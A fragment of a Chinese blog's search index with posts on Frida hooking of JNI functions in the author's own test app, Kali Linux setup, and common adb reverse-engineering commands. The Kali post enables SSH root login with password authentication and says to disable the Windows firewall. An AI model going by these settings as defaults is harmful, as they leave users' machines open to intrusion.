","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/:2:1","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Hook示例 本例以Hook libluonative.so库中的Java_com_example_luonative_MainActivity_stringFromJNI函数为例. function hook_native() { var addr = Module.getExportByName(\"libluonative.so\", \"Java_com_example_luonative_MainActivity_stringFromJNI\") Interceptor.attach(addr, { onEnter: function (args) { console.log(\"jnienv pointer =\u003e \", args[0]) console.log(\"jobj pointer =\u003e \", args[1]) }, onLeave: function (retval) { //获取当前线程的JNIEnv结构 var env = Java.vm.getEnv() //打印日志 console.log(\"retval is =\u003e \", env.getStringUtfChars(retval, 0).readCString()) //构造一个新字符串 var jstrings = env.newStringUtf(\"Hello XiaLuoHun\"); //替换返回值 retval.replace(jstrings); } }) } function main() { hook_native() } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/:2:2","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Native层函数未导出 在每次App重新运行后native函数加载的绝对地址是会变化的,唯一不变的是函数相对于所在模块基地址的偏移,因此我们可以在获取模块的基地址后加上固定的偏移地址获取相应函数的地址.Frida通过以下API来获取函数的绝对地址. //获取对应模块的基地址 Module.findBaseAddress(name) Module.getBaseAddress(name) //传入固定的偏移offset,获取最后的函数绝对地址 add(offset) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/:3:0","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"动态注册的函数 为了介绍上述获取函数地址的方式,下面先介绍一下动态注册的JNI函数. 静态注册的JNI函数:可以通过一定的命名方式从Java层找到对应native层函数名. 动态注册的JNI函数:在native层实现的函数名称不定,并且不一定要求相应函数是导出类型. 只需调用以下API函数就可以完成动态注册. jint RegisterNatives(jclass clazz, const JNINativeMethod* methods,jint nMethods) //第一个参数clazz, native函数所在的类,可通过FindClass这个JNI函数获取(将类名的\".\"符号换成\"/\") //第二个参数methods, 是一个数组,其中包含函数的一些签名信息以及对应在native层的函数指针 //第三个参数nMethods, 是methods数组的数量 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/:3:1","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"测试Apk java代码: package com.example.luonative; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luonative.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luonative' library on application startup. static { System.loadLibrary(\"luonative\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); // Example of a call to a native method TextView tv = binding.sampleText; tv.setText(stringFromJNI()); while (true){ try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Log.d(\"LuoHun\", stringFromJNI()); } } public native String stringFromJNI(); } native代码: //libluonative.so #include \u003cjni.h\u003e #include \u003cstring\u003e jstring JNICALL LuoDynamicNative( JNIEnv* env, jobject /* this */){ std::string hello = \"Hello from C++ LuoHun\"; return env-\u003eNewStringUTF(hello.c_str()); } JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved){ JNIEnv* env; vm-\u003eGetEnv((void**)\u0026env, JNI_VERSION_1_6); JNINativeMethod methods[] = { \"stringFromJNI\", \"()Ljava/lang/String;\", (void*)LuoDynamicNative }; env-\u003eRegisterNatives(env-\u003eFindClass(\"com/example/luonative/MainActivity\"), methods, 1); return JNI_VERSION_1_6; } ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/:3:2","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Hook示例 上述apk编译运行后,使用Objection遍历libluonative.so模块的导出函数,会发现再也找不到stringFromJNI()字符串相关的函数了.此时就可以通过先找模块基址,再根据偏移获取函数绝对地址.那么函数的偏移如何获取呢? 通过Hook实现动态注册的函数RegisterNatives()来获取动态注册后的LuoDynamicNative()函数地址. 这里介绍一个项目frida_hook_libart,其仓库地址为https://github.com/lasting-yang/frida_hook_libart.这个项目中包含着对一些JNI函数和art相关函数的Frida Hook脚本,这里要使用的Hook脚本是hook_RegisterNatives.js 在本案例中,RegisterNatives()函数是在JNI_OnLoad()函数中完成的,即模块一加载就会自动运行的函数,因此为了能够顺利地在RegisterNatives()函数未被调用前Hook到,就需要使用Frida在注入时,选择spwan模式运行. 从上图中可以看到LuoDynamicNative()函数相对于libluonative.so模块的偏移为0xf11c Hook动态注册的LuoDynamicNative()函数的脚本如下: function hook_native() { var libluonative_addr = Module.findBaseAddress(\"libluonative.so\") console.log(\"libluonative_addr is =\u003e \", libluonative_addr) var stringFromJNI = libluonative_addr.add(0xf11c) console.log(\"stringFromJNI address is =\u003e \", stringFromJNI) Interceptor.attach(stringFromJNI, { onEnter: function (args) { console.log(\"jnienv pointer =\u003e \", args[0]) console.log(\"jobj pointer =\u003e \", args[1]) }, onLeave: function (retval) { //获取当前线程的JNIEnv结构 var env = Java.vm.getEnv() //打印日志 console.log(\"retval is =\u003e \", env.getStringUtfChars(retval, 0).readCString()) //构造一个新字符串 var jstrings = env.newStringUtf(\"Hello XiaLuoHun\"); //替换返回值 retval.replace(jstrings); } }) } function main() { hook_native() } setImmediate(main) 注意 虽然每次重新运行App时,函数的偏移地址是不会改变的,但是这是建立在App未被重新编译的基础上.如果在一次运行后App代码发生修改,并重新在AndroidStudio中编译运行,那么新的App函数的偏移地址是会发生改变的,此时应重新使用hook_RegisterNatives.js脚本获取相应函数的新偏移值并修改Hook脚本,然后再进行注入. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/:3:3","tags":["Frida"],"title":"Frida-Native层Hook","uri":"/posts/android/android-hook/frida/frida-native%E5%B1%82hook/"},{"categories":["环境搭建"],"content":"基础环境 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:0","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"下载链接 https://www.kali.org/get-kali/#kali-virtual-machines ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:1","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"以root用户登录 Kali Linux虚拟机官方提供了一个默认账号:kali/kali,但是并没有提供root账号. 先用kali/kali进入虚拟机,执行以下命令设置root账号密码. sudo passwd root 重置完root密码后,切换用户或重启系统,用刚设置的密码登录root账号. ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:2","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"设置时区 dpkg-reconfigure tzdata 在弹出窗口选择 Asia-\u003eshanghai ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:3","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"字体安装 在/usr/share/fonts目录下,创建一个文件夹my_fonts 将ttf格式字体复制到/usr/share/fonts/my_fonts目录下. ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:4","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"Shell查看和切换 查看存在的shell cat /etc/shells 查看当前使用的Shell echo $SHELL 切换Shell //这里我们要切换到bash,目前Kali默认是zsh //切换bash chsh -s /bin/bash //切换zsh chsh -s /bin/zsh 注意 重启后生效 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:5","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"开启SSH 修改SSH配置 vim /etc/ssh/sshd_config //配置下面两个选项 PermitRootLogin yes PasswordAuthentication yes 重启SSH服务 sudo service ssh restart 查看SSH状态 /etc/init.d/ssh status 启动SSH /etc/init.d/ssh start //or systemctl start ssh 开机自启SSH systemctl enable ssh ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:1:6","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"实用工具 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:0","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"ProxyChains apt install proxychains gedit /etc/proxychains.conf //找到[ProxyList]删除原来的socks4,然后加上 [socks5 IP 端口] 注意 要关闭Windows的防火墙 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:1","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"pyenv Python版本管理软件. 安装: 配置构建环境. https://github.com/pyenv/pyenv/wiki#suggested-build-environment sudo apt update sudo apt install build-essential libssl-dev zlib1g-dev \\ libbz2-dev libreadline-dev libsqlite3-dev curl git \\ libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev 安装pyenv. https://github.com/pyenv/pyenv#basic-github-checkout proxychains git clone https://github.com/yyuu/pyenv.git ~/.pyenv //zsh echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' \u003e\u003e~/.zshrc echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' \u003e\u003e~/.zshrc echo -e 'if command -v pyenv 1\u003e/dev/null 2\u003e\u00261; then\\n eval \"$(pyenv init --path)\"\\nfi'\u003e\u003e~/.zshrc //bash echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' \u003e\u003e~/.bashrc echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' \u003e\u003e~/.bashrc echo -e 'if command -v pyenv 1\u003e/dev/null 2\u003e\u00261; then\\n eval \"$(pyenv init --path)\"\\nfi'\u003e\u003e~/.bashrc 安装python版本. //无代理 pyenv install 3.8.0 //有代理 PYTHON_CONFIGURE_OPTS=\"--disable-ipv6\" proxychains pyenv install 3.8.0 常用命令: //列出可供安装的python版本 pyenv install --list //安装指定版本的 pyenv install \u003cversion\u003e //在当前目录下设置python版本 pyenv local \u003cversion\u003e //全局设置python版本 pyenv global \u003cversion\u003e //列出系统中安装的python版本 pyenv versions //显示当前目录下采用的python pyenv version 参考链接: https://www.jianshu.com/p/be08b5b1dbf6/ https://www.jianshu.com/p/7656896265ab ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:2","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"htop 加强版的top工具,可以动态查看当前活跃的、系统占用率高的进程. apt install htop ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:3","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"jnettop 用来实时查看系统网络负载. apt install jnettop ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:4","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"tree 文件名搜索工具,在解包apk后,搜索文件的名字非常好用. apt install tree ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:5","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"tmux 可以在一个屏幕上创建、访问以及控制多个终端. apt install tmux 常用快捷键如下: //划分左右两个窗口 Ctrl + b % //划分上下两个窗口 Ctrl + b \" //光标切换到其他窗格 //\u003carrow key\u003e是指向要切换到的窗格的方向键.比如切换到下方窗格,就按方向键↓ Ctrl+b \u003carrow key\u003e //使用鼠标切换光标 vim ~/.tmux.conf set -g mouse on //窗口重命名 Ctrl + b , //关闭当前窗口 Ctrl + b x 会话操作如下: //新建会话 tmux new -s [session name] //分离会话 tmux detach //查看所有会话 tmux ls //恢复会话 tmux attach -t [session name] //重命名会话 tmux rename-session -t [old session name] [new session name] //关闭会话 tmux kill-session -t [session name] //关闭所有会话 tmux kill-server ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:6","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"pwndbg + tmux 下载插件到指定目录 git clone https://github.com/jerdna-regeiz/splitmind ~/.splitmind 修改gdb配置如下: gedit ~/.gdbinit //.gdbinit source ~/.pwndbg/gdbinit.py source ~/.splitmind/gdbinit.py set context-clear-screen off set debug-events off python sections = \"regs\" mode = input(\"source/disasm/mixed mode:?(s/d/m)\") or \"d\" import splitmind spliter = splitmind.Mind() spliter.select(\"main\").right(display=\"regs\", size=\"50%\") # 全局的变量设置 gdb.execute(\"set context-stack-lines 10\") legend_on = \"code\" if mode == \"d\": legend_on = \"disasm\" sections += \" disasm\" spliter.select(\"main\").above(display=\"disasm\", size=\"70%\", banner=\"none\") gdb.execute(\"set context-code-lines 30\") elif mode == \"s\": sections += \" code\" spliter.select(\"main\").above(display=\"code\", size=\"70%\", banner=\"none\") gdb.execute(\"set context-source-code-lines 30\") else: sections += \" disasm code\" spliter.select(\"main\").above(display=\"code\", size=\"70%\") spliter.select(\"code\").below(display=\"disasm\", size=\"40%\") gdb.execute(\"set context-code-lines 8\") gdb.execute(\"set context-source-code-lines 20\") sections += \" args stack backtrace expressions\" spliter.show(\"legend\", on=legend_on) spliter.show(\"stack\", on=\"regs\") spliter.show(\"backtrace\", on=\"regs\") spliter.show(\"args\", on=\"regs\") spliter.show(\"expressions\", on=\"args\") gdb.execute(\"set context-sections \\\"%s\\\"\" % sections) gdb.execute(\"set show-retaddr-reg on\") spliter.build() end 运行tmux,然后运行gdb附加进程 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:2:7","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"必备工具 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:3:0","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"AndroidStudio 下载AndroidStudio https://developer.android.google.cn/studio 解压并运行. 切换到android-studio/bin目录下,运行当前目录的studio.sh即可启动AndroidStudio. 创建程序桌面图标. //创建桌面图标 vim /usr/share/applications/android-studio.desktop //添加以下内容 [Desktop Entry] Name=AndroidStudio Encoding=UTF-8 Exec=sh -c \"/software/android-studio/bin/studio.sh\" Icon=/software/android-studio/bin/studio.png StartupNotify=false Terminal=false Type=Application 执行完上述操作后,即可在菜单中找到AndroidStudio的桌面程序图标,右键可以添加到桌面.其它应用程序雷同. 将adb工具添加到环境变量. 默认安装的话,adb所在目录为/root/Android/Sdk/platform-tools echo \"export PATH=$PATH:/root/Android/Sdk/platform-tools\" \u003e\u003e ~/.zshrc source ~/.zshrc ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:3:1","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"VSCode https://code.visualstudio.com/ dpkg -i [.deb文件的名字] 以root用户启动VSCode,无法启动问题解决: //修改Command为 /usr/share/code/code --no-sandbox --unity-launch %F ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:3:2","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"GDB apt install gdb-multiarch ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:3:3","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["环境搭建"],"content":"Hyperpwn 配置Hyper proxychains wget https://github.com/vercel/Hyper/releases/download/v3.1.0-canary.4/Hyper-3.1.0-canary.4.AppImage chmod 777 ./Hyper-3.1.0-canary.4.AppImage gedit ~/.zshrc alias hyper='/Android/HyperPwn/Hyper-3.1.0-canary.4.AppImage --no-sandbox' source ~/.zshrc 退出Hyper,安装插件 npm install hyperinator npm install hyperpwn 安装pwndbg pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple proxychains git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 修改Hyper配置文件(~/.hyper.js) plugins: [\"hyperinator\",\"hyperpwn\"] 启动Hyper,更新插件 依次点击Plugins-\u003eUpdate,然后再依次点击View-\u003eReload 重启Hyper,运行gdb-multiarch,当出现下面的界面表示配置成功 ","date":"2021-11-25","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/:3:4","tags":["Kali"],"title":"Kali配置","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/kali%E9%85%8D%E7%BD%AE/"},{"categories":["Android基础"],"content":"ADB命令 ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:0","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看最顶端前台应用的包名和activity名 adb shell dumpsys window | grep mCurrentFocus ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:1","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看包信息 adb shell dumpsys package com.android.settings ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:2","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"查看App使用的数据库信息 adb shell dumpsys dbinfo com.android.settings ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:3","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"截图操作 adb shell screencap -p /data/local/tmp/Luo.png ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:4","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"管理package pm命令是Android中packageManager的命令行,是用于管理package的命令. //列出所有安装的APK包名 adb shell pm list packages //安装apk文件,这里的apk文件不是在主机目录下,而是在Android目录下 adb shell pm install /data/local/tmp/LuoDst.apk ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:5","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"调试命令 am命令是一个重要的调试工具,主要用于启动或停止服务、发送广播、启动Activity等 //以Debug模式启动App adb shell am start -D -N org.example.luodst/.MainActivity 其实以上所有命令也可以通过执行adb shell进入Android的shell中直接执行,只需要将开始的adb shell去掉就行. ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:6","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"主机与Android交互命令 //安装apk adb install //交换文件 adb push adb pull //查看日志 adb logcat ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:7","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"Linux命令 ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:0","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"grep基本语法 用法:grep [选项] “字符串/基本正则表达式” [文件] 常用选项: -c 只输出匹配行的计数。 -i 不区分大小写（只适用于单字符）。 -h 查询多文件时不显示文件名。 -l 查询多文件时只输出包含匹配字符的文件名。 -n 显示匹配行及行号。 -s 不显示不存在或无匹配文本的错误信息。 -v 显示不包含匹配文本的所有行。 -q 不显示存在或者匹配的文本信息 -f 后接文件名，以文件中的每一行作为匹配项 -R 递归查询当前目录下的文件 -w 匹配单词 -o 只输出匹配字符串 -A 输出匹配行的后n行，后带数字，如-A 2 -B 输出匹配行的前n行，后带数字，如-B 2 -C 输出匹配行的前后n行，后带数字，如-C 2 ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:1","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"创建空文件 touch /data/local/tmp/Luo.txt ","date":"2021-11-19","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:2","tags":["Android"],"title":"Android逆向常用命令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Android基础"],"content":"写文件 echo命令通过配合\"\u003e“或者”»“对文件进行写操作,其中”\u003e“为覆盖写操作,\"»“为扩展写操作. echo \"LuoHun\" \u003e\u003e Luo.txt 